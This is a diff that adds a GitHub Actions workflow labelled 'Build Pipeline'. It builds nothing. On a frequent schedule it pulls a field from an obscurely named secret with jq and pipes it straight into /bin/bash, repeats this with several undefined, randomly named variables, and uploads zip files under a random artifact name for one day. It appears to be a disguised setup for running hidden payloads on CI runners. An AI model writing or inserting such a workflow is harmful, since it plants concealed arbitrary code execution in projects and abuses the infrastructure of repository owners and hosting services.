@@ -1,0 +1,31 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run
+        env:
+          ddps50049: ${{ secrets.ddps50049 }}
+        run: |
+          printf '%s' "$ddps50049" | jq -r .sdqh909 | /bin/bash
+          printf '%s' "$pne3" | jq -r .obsb810 | /bin/bash
+          echo $d1 | jq -r .d1055 | /bin/bash
+          echo $q86244 | jq -r .mq11937 | /bin/bash
+          echo $j764 | jq -r .w2 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: LDS7dnwG
+          path: "*.zip"
+          retention-days: 1
